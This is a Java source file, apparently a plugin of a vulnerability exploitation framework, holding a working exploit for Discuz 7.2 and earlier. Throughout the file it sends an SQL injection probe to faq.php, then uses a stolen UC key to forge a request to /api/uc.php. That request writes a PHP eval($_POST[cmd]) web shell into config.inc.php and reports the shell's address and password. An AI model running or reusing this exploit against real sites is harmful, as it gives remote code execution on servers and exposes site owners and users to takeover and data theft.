package cn.com.nike.policy.policy;

import java.io.IOException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.lang.StringUtils;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

import cn.com.nike.policy.base.Policy;
import cn.com.nike.policy.base.PolicyInfo;
import cn.com.nike.policy.bean.ParameterConstant;
import cn.com.nike.policy.bean.WebShell;
import cn.com.nike.policy.bean.WebVulnData;
import cn.com.nike.policy.util.PolicyUtil;

public class Discuz_72_GetShell extends PolicyInfo implements Policy {

	private String url = "";

	public Discuz_72_GetShell() {
		POLICYNAME = Discuz_72_GetShell.class.getName();
		POLICYID = "SSV-ID: 87114";
		POLICYCOMPANY = "DISCUZ";
		POLICYTIME = "2014-07-07";
		POLICYDESCRIPTION = "Discuz <= 7.2 getshell";
	}

	@Override
	public void setParameter(Map<String, Object> parameters) {
		url = parameters.get("url").toString();
		PAYLOAD_CHECK = "/faq.php?action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(md5(0x61646d696e),"
				+ "floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23";
		PAYLOAD_EXPLOIT = "/manyou/admincp.php?my_suffix=%0A%0DTOBY57";
	}

	@Override
	public boolean check() throws IOException {
		CloseableHttpClient httpclient = HttpClients.createDefault();
		CloseableHttpResponse response = null;
		try {
			HttpGet httpget = new HttpGet(url + PAYLOAD_CHECK);
			response = httpclient.execute(httpget);
			HttpEntity entity = response.getEntity();
			int code = response.getStatusLine().getStatusCode();
			String content = EntityUtils.toString(entity);
			if (code == 200 && content.contains(DigestUtils.md5Hex("admin"))) {
				log.info("存在注入");
				return true;
			}else{
				log.warn("漏洞不存在");
			}
		} catch (Exception e) {
			log.error("检测异常", e);
		} finally {
			if (response != null)
				response.close();
			httpclient.close();
		}

		return false;
	}

	@Override
	public WebVulnData exploit() throws IOException {

		WebVulnData webVulnData = new WebVulnData();

		String timestamp = System.currentTimeMillis() / 1000 + 10 * 3600 + "";
		Discuz_72_Injection_RetrieveUc_key policy = new Discuz_72_Injection_RetrieveUc_key();
		Map<String, Object> parameters = new HashMap<String, Object>();
		parameters.put("url", url);
		policy.setParameter(parameters);
		webVulnData = policy.exploit();

		String uc_key = webVulnData.getResult().size() == 1 ? webVulnData
				.getResult().get(0).get(ParameterConstant.UC_KEY).toString()
				: "";
		if (StringUtils.isEmpty(uc_key))
			return webVulnData;
		String code = URLEncoder.encode(PolicyUtil.auth("time=" + timestamp
				+ "&action=updateapps", uc_key), "utf-8");
		String cmd1 = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><root><item id=\"UC_API\">xxx\');eval($_POST[cmd]);//</item></root>";
		String cmd2 = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><root><item id=\"UC_API\">aaa</item></root>";

		String html1 = PolicyUtil.send(url + "/api/uc.php?code=" + code, cmd1,
				5000);
		String html2 = PolicyUtil.send(url + "/api/uc.php?code=" + code, cmd2,
				5000);
		if (html1.equals("1") && html2.equals("1")) {
			log.info(html1 + " " + html2);
			log.info(PolicyUtil.successMessage(url + "/config.inc.php", "cmd"));
			WebShell shell = new WebShell();
			shell.setUrl(url + "/config.inc.php");
			shell.setPass("cmd");
			webVulnData.setShell(shell);
		}else{
			log.warn("上传webshell失败 ->status "+html1);
		}
		return webVulnData;
	}

	public static void main(String[] args) throws IOException {

		Map<String, Object> parameters = new HashMap<String, Object>();
		parameters.put("url", "http://127.0.0.1:81/discuz71");
		Discuz_72_GetShell policy = new Discuz_72_GetShell();
		policy.setParameter(parameters);
		if (policy.check())
			policy.exploit();

	}

}
